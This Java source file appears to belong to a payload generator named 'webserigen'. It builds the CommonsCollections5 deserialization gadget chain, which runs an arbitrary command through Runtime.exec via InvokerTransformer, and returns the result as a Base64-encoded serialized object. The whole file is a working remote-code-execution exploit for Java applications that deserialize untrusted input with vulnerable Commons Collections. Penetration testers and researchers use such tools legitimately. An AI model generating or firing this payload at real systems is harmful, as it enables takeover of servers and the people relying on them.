package org.hasret.webserigen.payloads;
/**
 * 类描述
 *
 * @author Double
 * @version 1.0
 * @since 2025/4/1
 */

import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.hasret.webserigen.utils.serial;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import javax.management.BadAttributeValueExpException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

/*
* BadAttributeValueExpException.readObject()
TiedMapEntry.toString()
  TiedMapEntry.getValue()
     LazyMap.get()
        ChainedTransformer.transform()
           InvokerTransformer.transform()
           * */
public class CommonsCollections5 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        String s = generatePayload("calc");
    }
    public static String generatePayload(final String cmd) throws NoSuchMethodException, ClassNotFoundException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {null,new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new String[]{cmd})});
        Map<Object, Object> hashMap = new HashMap<>();
        Map<Object, Object> lazymap = LazyMap.decorate(hashMap,chain);
        //将lazyMap传给TiedMapEntry
        TiedMapEntry entry = new TiedMapEntry(lazymap, "ta0");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,entry);//反射把TiedMapEntry赋给BadAttributeValueExpException 的val属性

//        serial.unserialize("ser.bin");

        return serial.serializeBytesToB64(badAttributeValueExpException);
    }
}
